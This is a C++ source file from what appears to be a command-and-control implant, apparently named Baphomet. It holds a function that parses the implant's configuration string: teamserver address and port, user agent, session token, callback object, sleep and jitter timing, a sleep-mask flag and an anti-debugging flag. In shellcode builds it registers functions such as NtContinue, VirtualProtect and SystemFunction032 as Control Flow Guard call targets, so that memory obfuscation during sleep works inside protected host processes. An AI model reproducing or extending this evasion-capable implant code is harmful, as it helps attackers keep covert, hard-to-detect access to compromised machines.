//
// Created by diago on 2024-06-14.
//

#include <misc.hpp>


bool
tasking::init_config(const char* pmetadata, implant_context& ctx) {

    if(!pmetadata || pmetadata[0] == '\0' || !ctx.implant_base || !ctx.original_base) {
        return false;
    }


    std::vector<std::string> args;
    std::string              str = pmetadata; // the metadata should be null terminated.

    if(str.back() != '!') {
        str += '!';
    }

    size_t start            = 0;
    size_t next_delimeter   = str.find('!');


    DEBUG_PRINT("[*] Parsing metadata...\n");
    while(next_delimeter != std::string::npos) {
        if(next_delimeter > start) {
            args.push_back(str.substr(start, next_delimeter - start));
        }

        start = next_delimeter + 1;
        next_delimeter = str.find('!', start);
    }


    if(args.size() != 9) {
        DEBUG_PRINT("[*] Invalid metadata size! Expected 9, got %llu.\n", args.size());
        return false;
    }


    //
    // Note about string to integer conversion here:
    // we can't use newer, safer C++ conversion functions such as std::stol,
    // because these functions throw exceptions, and we cannot catch them inside of the implant.
    // we need to use good ol' atoi() and check if the value is 0 afterwards.
    //

    ctx.server_addr        = args[0];
    ctx.port               = atoi(args[1].c_str());
    ctx.user_agent         = args[2];
    ctx.session_token      = args[3];
    ctx.callback_object    = args[4];
    ctx.sleep_time         = atoi(args[5].c_str());
    ctx.jitter             = atoi(args[6].c_str()); // 0 is valid for jitter, though
    ctx.use_sleepmask      = args[7] == "true";
    ctx.prevent_debugging  = args[8] == "true";

    if(!ctx.port || !ctx.sleep_time) {
        DEBUG_PRINT("[!] Invalid metadata sent. Check port and sleep time values.\n");
        return false;
    }


    //
    // Display retrieved metadata
    //

    DEBUG_PRINT(
        "[+] Parsed metadata:\n"
        " - TeamServer Address: %s\n"
        " - TeamServer port: %hu\n"
        " - User/Agent: %s\n"
        " - Session Token: %s\n"
        " - Callback Object: %s\n"
        " - Sleep Time (ms): %llu\n"
        " - Jitter: %llu\n"
        " - Using Sleepmask: %s\n"
        " - Debug Prevention: %s\n",

        ctx.server_addr.c_str(),
        ctx.port,
        ctx.user_agent.c_str(),
        ctx.session_token.c_str(),
        ctx.callback_object.c_str(),
        ctx.sleep_time,
        ctx.jitter,
        args[7].c_str(),
        args[8].c_str()
    );


    //
    // Display additional context data
    //

    ctx.implant_size = get_img_size(static_cast<char*>(ctx.original_base));
    if(!ctx.implant_size) {
        return false;
    }

    DEBUG_PRINT(
        "\n[+] Additional Context Data:\n"
        " - Original Implant Base: 0x%p\n"
        " - Base Of Mapped Sections: 0x%p\n"
        " - Image Size: %u\n\n",

        ctx.original_base,
        ctx.implant_base,
        ctx.implant_size
    );


    //
    // Add CFG valid call targets if the process is CFG enforced and we're using sleep obf
    //

#ifdef BAPHOMET_COMPILE_FOR_SHELLCODE
    if(is_process_cfg_enforced() && ctx.use_sleepmask) {

        HMODULE hntdll    = LoadLibraryA("NTDLL.DLL");
        HMODULE hkernel32 = LoadLibraryA("KERNEL32.DLL");
        HMODULE hadvapi   = LoadLibraryA("ADVAPI32.DLL");

        if(!hntdll || !hkernel32 || !hadvapi) {
            DEBUG_PRINT("[!] CFG init: failed to resolve modules.\n");
            return false;
        }


        DEBUG_PRINT("[*] Host process is CFG-enforced. Adding call targets.");
        add_cfg_call_target((char*)hntdll,     GetProcAddress(hntdll,    "NtContinue"));
        add_cfg_call_target((char*)hntdll,     GetProcAddress(hntdll,    "RtlCaptureContext"));
        add_cfg_call_target((char*)hntdll,     GetProcAddress(hntdll,    "NtGetContextThread"));
        add_cfg_call_target((char*)hntdll,     GetProcAddress(hntdll,    "NtSetContextThread"));
        add_cfg_call_target((char*)hkernel32,  GetProcAddress(hkernel32, "VirtualProtect"));
        add_cfg_call_target((char*)hkernel32,  GetProcAddress(hkernel32, "WaitForSingleObject"));
        add_cfg_call_target((char*)hkernel32,  GetProcAddress(hkernel32, "SetEvent"));
        add_cfg_call_target((char*)hadvapi,    GetProcAddress(hadvapi,   "SystemFunction032"));
    }

#else
    ctx.use_sleepmask = false; // don't support sleep obf if we're running as an exe
#endif


    DEBUG_PRINT("[+] Finished parsing metadata.\n");
    return true;
}


